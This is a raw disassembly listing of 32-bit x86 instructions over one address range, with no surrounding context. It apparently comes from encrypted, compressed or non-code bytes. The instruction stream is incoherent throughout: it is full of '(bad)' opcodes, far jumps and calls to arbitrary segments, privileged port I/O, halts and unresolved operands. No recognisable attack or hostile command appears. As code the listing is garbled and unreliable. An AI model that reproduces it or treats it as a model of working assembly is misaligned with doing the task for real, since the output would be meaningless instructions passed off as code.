  41cb8f:	mov    ebp,0x2ca7c540
  41cb94:	into   
  41cb95:	sbb    al,BYTE PTR [eax]
  41cb97:	mov    edi,0xb6a6e5b5
  41cb9c:	xor    eax,0xa0583a5b
  41cba1:	mov    cl,0xd7
  41cba3:	test   eax,0x66ca0542
  41cba8:	or     al,BYTE PTR [esi-0xfe8200a]
  41cbae:	lods   al,BYTE PTR ds:[esi]
  41cbaf:	mov    edx,0x825feaae
  41cbb4:	test   al,0x1
  41cbb6:	cmp    eax,0xe9f32e1b
  41cbbc:	mov    ds:0x8606f18b,eax
  41cbc1:	jmp    0x573b:0x43f09020
  41cbc8:	mov    al,ds:0x91201e48
  41cbcd:	xchg   edx,eax
  41cbce:	dec    esp
  41cbcf:	ins    BYTE PTR es:[edi],dx
  41cbd0:	ins    BYTE PTR es:[edi],dx
  41cbd1:	and    al,0xd3
  41cbd3:	fs xchg ebp,eax
  41cbd5:	inc    ebp
  41cbd6:	addr16 ja 0x41cc0a
  41cbd9:	test   BYTE PTR [eax+0x4094077],ah
  41cbdf:	idiv   BYTE PTR [ebp+0x66]
  41cbe2:	repnz pop ds
  41cbe4:	fwait
  41cbe5:	gs and eax,0xfd321ada
  41cbeb:	sar    DWORD PTR [esi-0x21],cl
  41cbee:	jl     0x41cc6b
  41cbf0:	mov    dl,0xdf
  41cbf2:	scas   al,BYTE PTR es:[edi]
  41cbf3:	xchg   esp,eax
  41cbf4:	sbb    DWORD PTR [esi+0x44aec4e7],esi
  41cbfa:	pop    edx
  41cbfb:	mov    ecx,0x5aade458
  41cc00:	or     al,BYTE PTR [ebx]
  41cc02:	xchg   edi,eax
  41cc03:	push   esi
  41cc04:	lods   al,BYTE PTR ds:[esi]
  41cc05:	adc    bh,BYTE PTR [eax-0x4e2cb320]
  41cc0b:	cmc    
  41cc0c:	adc    DWORD PTR ds:0xda0a0af8,edx
  41cc12:	aam    0xc2
  41cc14:	repnz sbb ah,BYTE PTR [ebx]
  41cc17:	jmp    0x9ffc:0x5d17ee9b
  41cc1e:	jne    0x41cbf7
  41cc20:	jnp    0x41cbfa
  41cc22:	fadd   QWORD PTR [edi]
  41cc24:	xchg   ebp,eax
	...
  41cc31:	cdq    
  41cc32:	ja     0x41cc23
  41cc34:	out    dx,al
  41cc35:	out    dx,eax
  41cc36:	(bad)  
  41cc37:	cdq    
  41cc38:	ja     0x41cbcf
  41cc3a:	daa    
  41cc3b:	xor    DWORD PTR ds:0xd94f9c46,ecx
  41cc41:	jne    0x41cc8b
  41cc43:	add    DWORD PTR [eax],eax
  41cc45:	lods   al,BYTE PTR ds:[esi]
  41cc46:	add    eax,DWORD PTR [eax]
  41cc48:	add    cl,bh
  41cc4a:	cmp    al,0xef
  41cc4c:	or     bh,BYTE PTR [ebx-0x5]
  41cc4f:	jno    0x41cc9f
  41cc51:	or     eax,0x4e16382a
  41cc56:	dec    edx
  41cc57:	jne    0x41cc22
  41cc59:	(bad)  
  41cc5a:	ds addr16 jo 0x41cc87
  41cc5e:	inc    ecx
  41cc5f:	mov    al,0x5b
  41cc61:	(bad)  
  41cc62:	lods   eax,DWORD PTR ds:[esi]
  41cc63:	ror    esp,0x3d
  41cc66:	je     0x41cc4b
  41cc68:	(bad)  
  41cc69:	pop    ebx
  41cc6a:	jl     0x41cc0b
  41cc6c:	repz in al,0xd1
  41cc6f:	pop    ecx
  41cc70:	into   
  41cc71:	dec    edi
  41cc72:	(bad)  [edx-0x26]
  41cc75:	push   ds
  41cc76:	push   cs
  41cc77:	inc    esi
  41cc78:	lock ret 
  41cc7a:	cld    
  41cc7b:	popa   
  41cc7c:	mov    ebx,0x92f434b2
  41cc81:	mov    fs,ebx
  41cc83:	inc    ecx
  41cc84:	and    DWORD PTR [ebx+0x366d7700],0x2c8da5
  41cc8e:	xchg   esp,eax
  41cc8f:	shl    BYTE PTR [ebx],1
  41cc91:	xchg   ebx,eax
  41cc92:	enter  0x861d,0x30
  41cc96:	imul   ebp,DWORD PTR [ecx],0x7d574957
  41cc9c:	cmp    BYTE PTR [ebx+0x44ed7f26],dl
  41cca2:	(bad)  
  41cca3:	add    edx,esp
  41cca5:	mov    bh,dh
  41cca7:	and    edi,DWORD PTR [ecx]
  41cca9:	fyl2xp1 
  41ccab:	jp     0x41ccc9
  41ccad:	jbe    0x41cc73
  41ccaf:	xchg   esp,eax
  41ccb0:	clc    
  41ccb1:	and    BYTE PTR [edi+edi*1],dl
  41ccb4:	call   0x9a2b:0xe676b51b
  41ccbb:	jno    0x41cc8d
  41ccbd:	jge    0x41cc5f
  41ccbf:	mov    al,0x7e
  41ccc1:	dec    esi
  41ccc2:	sbb    BYTE PTR [ebx+0x74],al
  41ccc5:	pop    eax
  41ccc6:	xchg   BYTE PTR [edx-0x5fca5304],bl
  41cccc:	inc    ecx
  41cccd:	loopne 0x41ccb4
  41cccf:	push   esi
  41ccd0:	pop    edi
  41ccd1:	and    eax,0x1c966b37
  41ccd7:	inc    esi
  41ccd8:	xchg   edi,eax
  41ccd9:	fisttp DWORD PTR [ebx]
  41ccdb:	rcl    DWORD PTR [ebp-0x56],0xce
  41ccdf:	das    
  41cce0:	jbe    0x41cd3a
  41cce2:	xchg   ecx,eax
  41cce3:	test   BYTE PTR [ebx-0x1f],dl
  41cce6:	pop    edx
  41cce7:	adc    ah,BYTE PTR [edi]
  41cce9:	js     0x41cd64
  41cceb:	pop    ebp
  41ccec:	out    dx,eax
  41cced:	outs   dx,BYTE PTR ds:[esi]
  41ccee:	dec    ecx
  41ccef:	push   ecx
  41ccf0:	adc    ch,BYTE PTR [esi+0x343c5f1f]
  41ccf6:	mov    ah,0x97
  41ccf8:	inc    edx
  41ccf9:	sbb    eax,0x1f98947
  41ccfe:	ret    0xe9e3
  41cd01:	popa   
  41cd02:	test   al,0x7
  41cd04:	dec    esp
  41cd05:	sub    eax,0x3fd30fc2
  41cd0a:	lea    esi,[edx-0x8]
  41cd0d:	xchg   ecx,eax
  41cd0e:	int3   
  41cd0f:	adc    al,BYTE PTR [edx]
  41cd11:	ins    DWORD PTR es:[edi],dx
  41cd12:	aaa    
  41cd13:	cmp    eax,0x410c2ebd
  41cd18:	js     0x41cd3f
  41cd1a:	stos   BYTE PTR es:[edi],al
  41cd1b:	sbb    esi,DWORD PTR [edi]
  41cd1d:	not    BYTE PTR ds:0xfb9f6182
  41cd23:	retf   
  41cd24:	adc    edi,DWORD PTR [ecx-0x4]
  41cd27:	mov    bh,0xe9
  41cd29:	pushf  
  41cd2a:	loope  0x41cd18
  41cd2c:	frstor [edx]
  41cd2e:	dec    ebp
  41cd2f:	adc    BYTE PTR [ebx+ebp*4-0x6436b1c1],ch
  41cd36:	fs cmp eax,0xef112d89
  41cd3c:	pop    edi
  41cd3d:	nop
  41cd3e:	push   0x7387bf12
  41cd43:	pop    ss
  41cd44:	int    0x4a
  41cd46:	xchg   esp,eax
  41cd47:	test   cl,dh
  41cd49:	iret   
  41cd4a:	std    
  41cd4b:	xchg   esp,eax
  41cd4c:	adc    ebp,DWORD PTR [esi-0x526e4309]
  41cd52:	push   ecx
  41cd53:	retf   0xe6a9
  41cd56:	js     0x41cd1a
  41cd58:	and    cl,bh
  41cd5a:	xchg   ecx,eax
  41cd5b:	mov    esi,edx
  41cd5d:	imul   ebx,DWORD PTR [ebp+0x59],0xadf51eb
  41cd64:	inc    esi
  41cd65:	adc    DWORD PTR [edi-0x22112a41],ecx
  41cd6b:	inc    ebx
  41cd6c:	mov    eax,0x9abd1f34
  41cd71:	ins    DWORD PTR es:[edi],dx
  41cd72:	mov    ?,edi
  41cd74:	xchg   edx,eax
  41cd75:	pop    ecx
  41cd76:	ds push es
  41cd78:	dec    ebx
  41cd79:	ss and eax,0xcba14578
  41cd7f:	mov    edx,0x5c48e39b
  41cd84:	jg     0x41cd86
  41cd86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd87:	push   0xc345438a
  41cd8c:	xor    ebx,esi
  41cd8e:	repnz add BYTE PTR [esi],bh
  41cd91:	int3   
  41cd92:	jecxz  0x41cd24
  41cd94:	push   ecx
  41cd95:	scas   eax,DWORD PTR es:[edi]
  41cd96:	cmp    eax,0x34d0c9a1
  41cd9b:	mov    ds:0xbf8a8817,eax
  41cda0:	or     eax,0xcb94b46b
  41cda5:	iret   
  41cda6:	stos   BYTE PTR es:[edi],al
  41cda7:	imul   edi,DWORD PTR [ebx],0x6bb9d561
  41cdad:	jne    0x41ce16
  41cdaf:	sub    cl,cl
  41cdb1:	cmp    ecx,DWORD PTR [ecx]
  41cdb3:	ins    BYTE PTR es:[edi],dx
  41cdb4:	xor    DWORD PTR [ebx-0x64],0xffffff9b
  41cdb8:	push   cs
  41cdb9:	scas   al,BYTE PTR es:[edi]
  41cdba:	aaa    
  41cdbb:	lds    edi,FWORD PTR [edx-0x305b9bf3]
  41cdc1:	mov    edx,fs
  41cdc3:	icebp  
  41cdc4:	pop    ds
  41cdc5:	push   ss
  41cdc6:	cmp    ch,BYTE PTR [edx-0x79872776]
  41cdcc:	push   ebx
  41cdcd:	mov    ch,0xb0
  41cdcf:	inc    edx
  41cdd0:	enter  0x2003,0xf3
  41cdd4:	lds    edx,FWORD PTR [edx+0x1b]
  41cdd7:	clc    
  41cdd8:	popf   
  41cdd9:	daa    
  41cdda:	xor    bh,bl
  41cddc:	loope  0x41cdd3
  41cdde:	jo     0x41cd90
  41cde0:	or     ecx,DWORD PTR [ecx-0x1b]
  41cde3:	sbb    edx,DWORD PTR [edx+0xa]
  41cde6:	xchg   ebp,eax
  41cde7:	arpl   bp,bx
  41cde9:	inc    ecx
  41cdea:	cmc    
  41cdeb:	or     ch,BYTE PTR [eax+0x2b217925]
  41cdf1:	dec    ecx
  41cdf2:	jo     0x41ce22
  41cdf4:	lods   al,BYTE PTR ds:[esi]
  41cdf5:	and    al,0x15
  41cdf7:	and    ebx,DWORD PTR [edi+0x52]
  41cdfa:	cmp    eax,0x318478af
  41cdff:	out    dx,eax
  41ce00:	mov    WORD PTR [edx-0x49f4e0a4],?
  41ce06:	pop    ss
  41ce07:	je     0x41ce7c
  41ce09:	sbb    cl,al
  41ce0b:	shl    DWORD PTR [esi],1
  41ce0d:	push   esp
  41ce0e:	mov    edi,0x916f906d
  41ce13:	mov    al,ds:0x148fc148
  41ce18:	fs jmp 0x4e56b800
  41ce1e:	jecxz  0x41cdb9
  41ce20:	jb     0x41ce31
  41ce22:	push   cs
  41ce23:	mov    ds,WORD PTR [edi+ebp*1-0x77]
  41ce27:	dec    ecx
  41ce28:	mov    ss,esi
  41ce2a:	ins    DWORD PTR es:[edi],dx
  41ce2b:	push   0x4d6ad63c
  41ce30:	xor    dl,BYTE PTR [ebp-0x2ff191e5]
  41ce36:	inc    ebp
  41ce37:	adc    DWORD PTR [edx+esi*8+0x1a],ecx
  41ce3b:	call   0xf459:0xcf0d1f66
  41ce42:	add    edi,DWORD PTR [edx*4+0x3f032cba]
  41ce49:	es ss jae 0x41cdda
  41ce4d:	std    
  41ce4e:	fisubr WORD PTR [edx]
  41ce50:	js     0x41ce76
  41ce52:	aad    0x9
  41ce54:	mov    bl,0x65
  41ce56:	pusha  
  41ce57:	shl    BYTE PTR [esp+ecx*4+0x4d],1
  41ce5b:	sub    DWORD PTR [edi],0x2e
  41ce5e:	out    0xf9,al
  41ce60:	fimul  WORD PTR [ecx+0x20]
  41ce63:	into   
  41ce64:	sbb    eax,0x2a20af6c
  41ce69:	mov    ah,0x27
  41ce6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce6c:	iret   
  41ce6d:	mov    ebp,ecx
  41ce6f:	push   ss
  41ce70:	div    ah
  41ce72:	jmp    0xd708:0x7c9255c9
  41ce79:	mov    esp,0x22580052
  41ce7e:	test   edx,eax
  41ce80:	pop    ebp
  41ce81:	je     0x41ce33
  41ce83:	loope  0x41ce1a
  41ce85:	int3   
  41ce86:	push   edx
  41ce87:	int    0x89
  41ce89:	sub    esi,edi
  41ce8b:	inc    edx
  41ce8c:	dec    esi
  41ce8d:	test   dl,ah
  41ce8f:	arpl   bp,si
  41ce91:	or     eax,0x7ad922be
  41ce96:	loop   0x41ce50
  41ce98:	add    eax,0x7cfd328c
  41ce9d:	mov    dl,0x48
  41ce9f:	inc    esi
  41cea0:	or     DWORD PTR [edx-0x45cce0d5],esp
  41cea6:	inc    eax
  41cea7:	fimul  WORD PTR [ecx]
  41cea9:	pop    esp
  41ceaa:	mov    ds:0xe5b89059,eax
  41ceaf:	jno    0x41cefb
  41ceb1:	ja     0x41ce86
  41ceb3:	jno    0x41ce57
  41ceb5:	pop    eax
  41ceb6:	push   edi
  41ceb7:	add    esi,DWORD PTR [ebp+0x31]
  41ceba:	jp     0x41ce3e
  41cebc:	call   0x658f:0x3d7b0c44
  41cec3:	faddp  st(2),st
  41cec5:	cli    
  41cec6:	mov    ?,WORD PTR ss:[ebx+edi*8-0x4b0fa3d7]
  41cece:	cmp    dl,bl
  41ced0:	imul   ebp,DWORD PTR [ecx+0x4557743c],0xd623bf2d
  41ceda:	cmc    
  41cedb:	jg     0x41cf07
  41cedd:	push   cs
  41cede:	xchg   edx,eax
  41cedf:	push   esi
  41cee0:	int    0xcf
  41cee2:	paddw  mm6,mm6
  41cee5:	repz test DWORD PTR [edi+edx*1],esi
  41cee9:	popf   
  41ceea:	call   0x4c4aec53
  41ceef:	stos   DWORD PTR es:[edi],eax
  41cef0:	cdq    
  41cef1:	push   esp
  41cef2:	pop    esi
  41cef3:	pusha  
  41cef4:	test   DWORD PTR [eax+eiz*4+0x46],ecx
  41cef8:	pop    ebp
  41cef9:	enter  0xb623,0x3b
  41cefd:	jne    0x41cef3
  41ceff:	ss stos DWORD PTR es:[edi],eax
  41cf01:	xor    DWORD PTR [edx],esi
  41cf03:	or     eax,0x483169c5
  41cf08:	outs   dx,DWORD PTR ds:[esi]
  41cf09:	sbb    dl,BYTE PTR fs:[eax+eax*8]
  41cf0d:	out    dx,eax
  41cf0e:	lock jo 0x41cf21
  41cf11:	inc    eax
  41cf12:	xchg   ebx,eax
  41cf13:	arpl   WORD PTR [ecx-0x12],bx
  41cf16:	popa   
  41cf17:	fsin   
  41cf19:	dec    esi
  41cf1a:	fld    QWORD PTR [ecx+edi*2]
  41cf1d:	bnd jle 0x41cef0
  41cf20:	loopne 0x41ceb1
  41cf22:	and    dl,BYTE PTR [edi+0x3a7fed9f]
  41cf28:	in     al,dx
  41cf29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf2a:	in     eax,dx
  41cf2b:	ds sti 
  41cf2d:	xor    ah,al
  41cf2f:	dec    ebx
  41cf30:	xchg   BYTE PTR [edi],ah
  41cf32:	stc    
  41cf33:	mov    ebx,0xdf5f0364
  41cf38:	test   BYTE PTR [ebp+0x64],0x95
  41cf3c:	leave  
  41cf3d:	and    cl,BYTE PTR [edi]
  41cf3f:	mov    ds:0x4f8ff7ca,al
  41cf44:	retf   0xac94
  41cf47:	adc    edx,DWORD PTR [ebx-0x43a77704]
  41cf4d:	(bad)  
  41cf4e:	push   esp
  41cf4f:	fs push ecx
  41cf51:	imul   ebx,ebp,0xb5133c40
  41cf57:	test   DWORD PTR [ebp-0x1d],0x9f44ab25
  41cf5e:	hlt    
  41cf5f:	dec    ebx
  41cf60:	add    eax,0xb225f09b
  41cf65:	xchg   ah,ah
  41cf67:	mov    bl,0x83
  41cf69:	icebp  
  41cf6a:	adc    dh,ah
  41cf6c:	stos   DWORD PTR es:[edi],eax
  41cf6d:	out    dx,al
  41cf6e:	adc    BYTE PTR [ecx-0x77],bh
  41cf71:	or     BYTE PTR [ecx-0x67],ah
  41cf74:	sbb    ebx,DWORD PTR [edx-0x45e69e25]
  41cf7a:	or     bh,BYTE PTR [ebp-0x6877e9b2]
  41cf80:	mov    bh,0x25
  41cf82:	sbb    bl,BYTE PTR [ecx+eiz*1-0x5d]
  41cf86:	xchg   DWORD PTR ds:0x936d1ba6,esi
  41cf8c:	cmp    bh,BYTE PTR [eax]
  41cf8e:	retf   0xb9da
  41cf91:	cmp    eax,0x31018f57
  41cf96:	cli    
  41cf97:	cli    
  41cf98:	jb     0x41cf48
  41cf9a:	mov    dl,0xf6
  41cf9c:	or     DWORD PTR [edx-0x5c130eb8],edi
  41cfa2:	or     eax,0x1a6401c7
  41cfa7:	mov    dl,0x6c
  41cfa9:	dec    ecx
  41cfaa:	add    BYTE PTR [eax-0x2b],dh
  41cfad:	mov    bl,0xdf
  41cfaf:	dec    esp
  41cfb0:	jo     0x41cfdc
  41cfb2:	bound  esi,QWORD PTR [ecx+esi*2+0x65fd2e1b]
  41cfb9:	pop    esi
  41cfba:	sub    eax,0xdfb280
  41cfbf:	add    ch,ah
  41cfc1:	mov    ch,0x59
  41cfc3:	test   BYTE PTR [edx-0x7c],ah
  41cfc6:	mov    edx,0xeb6a1bcd
  41cfcb:	sbb    eax,0xb0a34b43
  41cfd0:	or     DWORD PTR [edx+0x623b9444],ebp
  41cfd6:	outs   dx,BYTE PTR ds:[esi]
  41cfd7:	inc    edi
  41cfd8:	mov    cl,BYTE PTR [esi+0x3b6516ed]
  41cfde:	arpl   WORD PTR ds:0x6e60e2b4,di
  41cfe4:	jo     0x41cf7b
  41cfe6:	add    ecx,ebx
  41cfe8:	scas   eax,DWORD PTR es:[edi]
  41cfe9:	jp     0x41d027
  41cfeb:	rcr    BYTE PTR [ebp-0x32],0x96
  41cfef:	pop    edx
  41cff0:	pop    es
  41cff1:	ja     0x41d027
  41cff3:	lods   al,BYTE PTR ds:[esi]
  41cff4:	push   eax
	...
  41d001:	xchg   edx,eax
  41d002:	inc    esp
  41d003:	mov    al,BYTE PTR [edi+0x559fcfde]
  41d009:	loop   0x41cf9a
  41d00b:	aad    0x3
  41d00d:	push   0x214795e1
  41d012:	dec    esp
  41d013:	add    DWORD PTR [eax],eax
  41d015:	lods   al,BYTE PTR ds:[esi]
  41d016:	add    eax,DWORD PTR [eax]
  41d018:	add    cl,ch
  41d01a:	and    al,bl
  41d01c:	in     eax,dx
  41d01d:	sti    
  41d01e:	pop    esp
  41d01f:	dec    ebx
  41d020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d021:	pop    es
  41d022:	repz xchg edi,eax
  41d024:	lock inc ecx
  41d026:	fcom   QWORD PTR [ebp+0x1a]
  41d029:	test   dh,bl
  41d02b:	mov    edi,ds
  41d02d:	ror    BYTE PTR [eax-0x76],1
  41d030:	(bad)  
  41d031:	ja     0x392216b1
  41d037:	stos   DWORD PTR es:[edi],eax
  41d038:	push   cs
  41d039:	xchg   ecx,eax
  41d03a:	add    DWORD PTR [esi+0x3d],0x4c
  41d03e:	or     DWORD PTR [eax],esi
  41d040:	push   cs
  41d041:	dec    edx
  41d042:	imul   BYTE PTR [edi]
  41d044:	call   0x3050:0xc802bf63
  41d04b:	jmp    0x8049:0x88b01005
  41d052:	adc    DWORD PTR fs:[eax+0xf],ebx
  41d056:	in     eax,dx
  41d057:	and    BYTE PTR [eax],dh
  41d059:	leave  
  41d05a:	jmp    0x41cfef
  41d05c:	jb     0x41d020
  41d05e:	sub    ecx,DWORD PTR [bp+di]
  41d061:	mov    al,ds:0xf5ce2bf4
  41d066:	fild   QWORD PTR [esi-0x6]
  41d069:	bnd call 0x885d715c
  41d06f:	ret    
  41d070:	push   0xa87205e
  41d075:	sub    esi,esp
  41d077:	mov    ebp,0xa1067e5
  41d07c:	out    0x39,eax
  41d07e:	in     eax,0xdb
  41d080:	push   ebp
  41d081:	in     al,dx
  41d082:	outs   dx,DWORD PTR ds:[esi]
  41d083:	cmp    ah,BYTE PTR [edx+0x20]
  41d086:	int3   
  41d087:	aas    
  41d088:	adc    cl,bh
  41d08a:	jge    0x41d03e
  41d08c:	dec    ebp
  41d08d:	daa    
  41d08e:	and    eax,0x9589ae6c
  41d093:	xchg   esp,eax
  41d094:	scas   al,BYTE PTR es:[edi]
  41d095:	mov    dh,ch
  41d097:	sbb    al,0xcf
  41d099:	fld    TBYTE PTR fs:[ecx+0x121067f1]
  41d0a0:	xor    ebx,DWORD PTR [ebx+0x38b70179]
  41d0a6:	cmp    al,0xe4
  41d0a8:	cmp    al,0xcb
  41d0aa:	xlat   BYTE PTR ds:[bx]
  41d0ac:	push   ebp
  41d0ad:	(bad)  
  41d0ae:	mov    ds:0x9ad8bb45,al
  41d0b3:	ins    BYTE PTR es:[edi],dx
  41d0b4:	pusha  
  41d0b5:	and    edx,DWORD PTR [esi+0x54]
  41d0b8:	(bad)  
  41d0b9:	adc    dl,BYTE PTR [ecx+0x47719399]
  41d0bf:	imul   ecx,DWORD PTR [ebx+0x4227c3f5],0x58
  41d0c6:	stos   BYTE PTR es:[edi],al
  41d0c7:	rcl    ebp,0x42
  41d0ca:	cmp    eax,0xc494b7b
  41d0cf:	daa    
  41d0d0:	fsub   DWORD PTR [ecx+0x13]
  41d0d3:	shl    BYTE PTR [ebx-0x349636b1],cl
  41d0d9:	test   eax,0xc4aee35b
  41d0de:	(bad)  
  41d0df:	mov    ds:0xd79f66db,eax
  41d0e4:	inc    edx
  41d0e5:	add    ebx,DWORD PTR ds:0x9fcbc820
  41d0eb:	sub    DWORD PTR [edx+0x524b76c5],edi
  41d0f1:	pusha  
  41d0f2:	ins    DWORD PTR es:[edi],dx
  41d0f3:	dec    BYTE PTR [ebx-0x22e197ef]
  41d0f9:	cmp    eax,DWORD PTR [ecx-0x6cef923]
  41d0ff:	pop    edi
  41d100:	dec    ebx
  41d101:	jb     0x41d093
  41d103:	(bad)  
  41d104:	fldenv [ecx+0x66]
  41d107:	scas   al,BYTE PTR es:[edi]
  41d108:	cmp    eax,0xb8ad077c
  41d10d:	test   dl,ah
  41d10f:	daa    
  41d110:	outs   dx,DWORD PTR ds:[esi]
  41d111:	dec    ebp
  41d112:	cmp    eax,DWORD PTR ds:0x70ef4641
  41d118:	push   eax
  41d119:	inc    esp
  41d11a:	inc    esi
  41d11b:	push   es
  41d11c:	jae    0x41d0dc
  41d11e:	cmp    DWORD PTR [eax+0x4f],edx
  41d121:	(bad)  
  41d122:	dec    ecx
  41d123:	push   cs
  41d124:	sub    DWORD PTR [ebx+0x72f501d5],ecx
  41d12a:	pop    es
  41d12b:	scas   eax,DWORD PTR es:[edi]
  41d12c:	popa   
  41d12d:	pop    ss
  41d12e:	icebp  
  41d12f:	loope  0x41d17f
  41d131:	mov    dl,dh
  41d133:	add    al,0xc2
  41d135:	fisttp WORD PTR [ebx-0x1edb8abd]
  41d13b:	aam    0x59
  41d13d:	shr    dh,cl
  41d13f:	jle    0x41d159
  41d141:	jge    0x41d0e0
  41d143:	pop    esi
  41d145:	dec    esp
  41d146:	add    edi,DWORD PTR [edx-0x1d]
  41d149:	adc    ch,bl
  41d14b:	mov    cl,0xa1
  41d14d:	inc    edi
  41d14e:	push   edi
  41d14f:	data16 ss mov bl,0x7d
  41d153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d154:	neg    bl
  41d156:	fst    DWORD PTR [ebx]
  41d158:	and    DWORD PTR [eax+0x3],ebx
  41d15b:	dec    edi
  41d15c:	sub    al,BYTE PTR [edi+ecx*8]
  41d15f:	sbb    bh,BYTE PTR [edi+0x2b69ba6f]
  41d165:	daa    
  41d166:	add    ecx,ebx
  41d168:	popa   
  41d169:	into   
  41d16a:	into   
  41d16b:	push   eax
  41d16c:	jnp    0x41d159
  41d16e:	mov    ecx,0xef74017d
  41d173:	and    eax,0x40260b55
  41d178:	out    0x1d,eax
  41d17a:	imul   ebp,DWORD PTR [esi+ebx*4],0xc206be34
  41d181:	xor    ebp,DWORD PTR [edx+ebx*8+0x6f236baf]
  41d188:	(bad)  
  41d18a:	out    dx,al
  41d18b:	mov    bh,0xd9
  41d18d:	(bad)  [eax-0x51419e61]
  41d193:	jge    0x41d160
  41d195:	imul   eax,DWORD PTR [esi+0x78],0xf8a6f725
  41d19c:	inc    edi
  41d19d:	add    BYTE PTR [edx+ebx*2+0x34],bh
  41d1a1:	ins    BYTE PTR es:[edi],dx
  41d1a2:	cld    
  41d1a3:	out    0xae,eax
  41d1a5:	inc    ecx
  41d1a6:	sub    ah,BYTE PTR cs:[edx+0x18]
  41d1aa:	out    dx,al
  41d1ab:	mov    eax,ds:0x40785660
  41d1b0:	mov    edx,gs
  41d1b2:	inc    esi
  41d1b3:	push   ds
  41d1b4:	lds    esi,FWORD PTR [edi-0x3185f8e2]
  41d1ba:	hlt    
  41d1bb:	jns    0x41d1bc
  41d1bd:	or     eax,0x6c22d64b
  41d1c2:	(bad)  
  41d1c3:	jmp    0x41d1df
  41d1c5:	mov    ds:0x880bd540,al
  41d1ca:	out    dx,al
  41d1cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1cc:	adc    al,0x3
  41d1ce:	mov    WORD PTR [ebx+0x4cb2da00],ss
  41d1d4:	mov    ds:0x23e65e75,al
  41d1d9:	int3   
  41d1da:	cli    
  41d1db:	mov    ecx,0xcad77419
  41d1e0:	repz aam 0xc7
  41d1e3:	call   0x2304:0xe8c9f24a
  41d1ea:	xor    al,0x92
  41d1ec:	dec    edi
  41d1ed:	pop    eax
  41d1ee:	fstp   TBYTE PTR [ebx-0x32]
  41d1f1:	jns    0x41d212
  41d1f3:	outs   dx,DWORD PTR ds:[esi]
  41d1f4:	xor    al,BYTE PTR [esp+ecx*4+0x27]
  41d1f8:	mov    eax,esp
  41d1fa:	movaps xmm1,XMMWORD PTR [edx-0x1b0b74a5]
  41d201:	ds (bad) 
  41d203:	cmp    al,0x2d
  41d205:	(bad)  
  41d206:	jno    0x41d235
  41d208:	pushf  
  41d209:	lods   al,BYTE PTR ds:[esi]
  41d20a:	mov    al,ds:0xa5e7b0b4
  41d20f:	test   DWORD PTR [eax+0x55507c0a],ebp
  41d215:	stos   DWORD PTR es:[edi],eax
  41d216:	sar    BYTE PTR [eax],cl
  41d218:	js     0x41d20e
  41d21a:	inc    esi
  41d21b:	or     al,BYTE PTR [eax]
  41d21d:	gs mov al,0x88
  41d220:	shl    BYTE PTR [edi-0x10a11446],1
  41d226:	push   edx
  41d227:	mov    esp,0x2aa5db73
  41d22c:	adc    eax,0xc27ebccf
  41d231:	retf   0x57
  41d234:	jno    0x41d2a4
  41d236:	add    BYTE PTR [eax-0x58f7d145],bl
  41d23c:	mov    ecx,0xfd548512
  41d241:	adc    DWORD PTR [ebx-0x39],ebx
  41d244:	or     BYTE PTR [esi],al
  41d246:	mov    ds:0x5a5b332b,al
  41d24b:	fucomp st(3)
  41d24d:	mov    ebx,0x7a2dc00
  41d252:	adc    eax,0x38968328
  41d257:	xchg   DWORD PTR [ebp+edi*2-0x61d18803],edx
  41d25e:	bound  esp,QWORD PTR ds:0xb494cf0b
  41d264:	push   esi
  41d265:	sub    BYTE PTR [eax+0x7d4d752b],ch
  41d26b:	add    ah,BYTE PTR [ebx]
  41d26d:	inc    esi
  41d26e:	mov    dl,0xb
  41d270:	repz dec edx
  41d272:	mov    edi,0x93e41686
  41d277:	mov    ah,0xb8
  41d279:	mov    edx,DWORD PTR [edx]
  41d27b:	jmp    0x1ba6:0xc91405be
  41d282:	add    DWORD PTR [edi-0x73],esp
  41d285:	into   
  41d286:	call   0xeaf8ace1
  41d28b:	xor    BYTE PTR [ebp-0x74bd778e],0xf4
  41d292:	sahf   
  41d293:	push   ecx
  41d294:	rcr    dl,1
  41d296:	iret   
  41d297:	rcr    DWORD PTR ds:[esi-0x3d],0x5d
  41d29c:	aaa    
  41d29d:	in     eax,dx
  41d29e:	push   edx
  41d29f:	and    DWORD PTR [eax],edx
  41d2a1:	mov    ecx,edi
  41d2a3:	or     edx,esi
  41d2a5:	sub    al,0xed
  41d2a7:	or     ch,BYTE PTR [ebx-0xf87f7f4]
  41d2ad:	dec    esi
  41d2ae:	mov    BYTE PTR [eax+0x4febcb6d],bl
  41d2b4:	popf   
  41d2b5:	in     al,dx
  41d2b6:	push   edx
  41d2b7:	adc    eax,0x56e1f4d4
  41d2bc:	cmp    esp,DWORD PTR [eax-0x49]
  41d2bf:	push   edi
  41d2c0:	jno    0x41d33f
  41d2c2:	lds    edx,FWORD PTR [edx+0x23726a15]
  41d2c8:	mov    bl,0xd9
  41d2ca:	das    
  41d2cb:	mov    DWORD PTR [bp-0x6e],eax
  41d2cf:	add    al,0x14
  41d2d1:	test   eax,0xc2d882c
  41d2d6:	stos   BYTE PTR es:[edi],al
  41d2d7:	add    bh,BYTE PTR [ecx-0x5b]
  41d2da:	loopne 0x41d34f
  41d2dc:	sbb    al,0xe8
  41d2de:	hlt    
  41d2df:	push   eax
  41d2e0:	sub    edx,DWORD PTR [eax]
  41d2e2:	or     al,0x9e
  41d2e4:	xor    eax,0x4b88bb50
  41d2e9:	addr16 cdq 
  41d2eb:	pop    edi
  41d2ec:	inc    ebx
  41d2ed:	xor    eax,0x40a9a948
  41d2f2:	xchg   esi,eax
  41d2f3:	pop    eax
  41d2f4:	mov    WORD PTR [ecx-0x5b],ss
  41d2f7:	pop    edx
  41d2f8:	in     eax,dx
  41d2f9:	je     0x41d374
  41d2fb:	mov    dl,BYTE PTR [ecx]
  41d2fd:	(bad)  
  41d2fe:	bound  edi,QWORD PTR [esi+0x6bf1d998]
  41d304:	xlat   BYTE PTR ds:[ebx]
  41d305:	adc    DWORD PTR [edx],ecx
  41d307:	js     0x41d334
  41d309:	dec    esi
  41d30a:	and    BYTE PTR [ecx+eiz*2-0x3e1dd5d4],ch
  41d311:	dec    eax
  41d312:	int3   
  41d313:	jle    0x41d384
  41d315:	lock xor ecx,DWORD PTR [edx]
  41d318:	ss enter 0x9b79,0xc4
  41d31d:	lods   eax,DWORD PTR ds:[esi]
  41d31e:	mov    ds:0x50450aae,al
